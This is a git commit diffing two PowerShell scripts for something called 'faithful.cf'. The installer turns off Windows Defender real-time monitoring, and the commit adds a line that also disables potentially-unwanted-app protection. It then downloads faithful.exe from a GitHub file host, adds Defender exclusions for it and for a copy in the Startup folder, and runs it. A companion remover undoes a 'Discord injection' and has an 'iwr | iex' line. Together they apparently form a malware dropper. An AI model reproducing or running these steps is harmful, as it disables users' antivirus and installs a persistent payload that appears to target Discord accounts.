b0b34c914251c2dd1244b15bdf00ad0698d4bd9a
thaddeuskkr <thaddeuskkr@gmail.com>
2022-04-12 09:30:29 +0800

    turn off PUA

--- faithful.sh
+++ faithful.sh
@@ -6,7 +6,8 @@ cd $env:userprofile
 Set-MpPreference -DisableRealtimeMonitoring $true
 Write-Output "Starting script..."
 Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
-Write-Output "Adding Windows Defender exclusion..."
+Write-Output "Adding Windows Defender exclusions..."
+Set-MpPreference -PUAProtection Disabled
 Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
 Add-MpPreference -ExclusionPath "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\faithful.exe"
 Start-Process ("faithful.exe")
--- remove-faithful.sh
+++ remove-faithful.sh
@@ -1,18 +1,21 @@
-# This script removes everything related to faithful.cf in your computer. Run this script as an administrator for it to fully work.
+# This script removes everything related to faithful.cf in your computer. 
+# Run this script as an administrator.
+# iwr remove.faithful.cf | iex
 
 cd $env:userprofile
 Write-Output "Removing faithful.cf files..."
 # Removing main exe
 rm -Force $env:userprofile\faithful.exe
-# Removing windows defender exclusions
-Remove-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
-Remove-MpPreference -ExclusionPath "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\faithful.exe"
 # Removing startup exe
 rm -Force "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\faithful.exe"
+# Removing windows defender exclusions
+Set-MpPreference -PUAProtection Enabled
+Remove-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
+Remove-MpPreference -ExclusionPath "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\faithful.exe"
 # Removing Discord injection (only works for the current version of Discord)
 Write-Output "Removing Discord injection..."
 $discordPath = Get-ChildItem -Directory -Filter app-* -Name C:\users\$env:username\AppData\Local\Discord
 $desktopCorePath = Get-ChildItem -Filter discord_desktop_core-* -Name C:\Users\$env:username\AppData\Local\Discord\$discordPath\modules
 "module.exports = require('./core.asar')" > C:\Users\$env:username\AppData\Local\Discord\$discordPath\modules\$desktopCorePath\discord_desktop_core\index.js
 # Done
-Write-Output "Removed faithful.cf executable files and Discord injection."
+Write-Output "Removed faithful.cf executable files, Windows Defender exclusions and Discord injection."
